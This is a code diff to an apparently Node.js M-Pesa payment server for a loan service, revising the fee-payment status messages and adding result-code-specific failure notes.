@@ -84,7 +84,7 @@ app.post("/pay", async (req, res) => {
         phone: formattedPhone,
         customer_name: "N/A",
         status: "pending",
-        status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete payment.`,
+        status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the paymentand loan disbursement. `,
         timestamp: new Date().toISOString()
       };
 
@@ -188,23 +188,45 @@ app.post("/callback", (req, res) => {
       phone: data.result?.Phone || existingReceipt.phone || null,
       customer_name: customerName,
       status: "success",
-      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes.`,
+      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes Contact support if withdrawal persists,Regards swift loan..`,
       timestamp: data.timestamp || new Date().toISOString(),
     };
-  } else {
-    receipts[ref] = {
-      reference: ref,
-      transaction_id: data.transaction_id,
-      transaction_code: null,
-      amount: data.result?.Amount || existingReceipt.amount || null,
-      loan_amount: existingReceipt.loan_amount || "50000",
-      phone: data.result?.Phone || existingReceipt.phone || null,
-      customer_name: customerName,
-      status: "cancelled",
-      status_note: data.result?.ResultDesc || "❗️Your Payment was  failed or was cancelled ,your loan will be on hold inthe next 24 hours before its disqualified.",
-      timestamp: data.timestamp || new Date().toISOString(),
-    };
+   } else {
+  // Default note from Safaricom / aggregator
+  let statusNote = data.result?.ResultDesc || "Payment failed or was cancelled.";
+
+  // Use ResultCode to give friendlier messages
+  switch (data.result?.ResultCode) {
+    case 1032: // Cancelled by user
+      statusNote = "You cancelled the payment on your phone. Please try again to complete your loan withdrawal.";
+      break;
+
+    case 1037: // STK Push timeout (no PIN entered)
+      statusNote = "The request timed out. You did not enter your M-Pesa PIN. Please try again.";
+      break;
+
+    case 2001: // Insufficient balance
+      statusNote = "Payment failed due to insufficient M-Pesa balance. Please top up and try again.";
+      break;
+
+    default:
+      // Leave statusNote as provided by API
+      break;
   }
+
+  receipts[ref] = {
+    reference: ref,
+    transaction_id: data.transaction_id,
+    transaction_code: null,
+    amount: data.result?.Amount || existingReceipt.amount || null,
+    loan_amount: existingReceipt.loan_amount || "50000",
+    phone: data.result?.Phone || existingReceipt.phone || null,
+    customer_name: customerName,
+    status: "cancelled",
+    status_note: statusNote,
+    timestamp: data.timestamp || new Date().toISOString(),
+  };
+}
 
   writeReceipts(receipts);
 
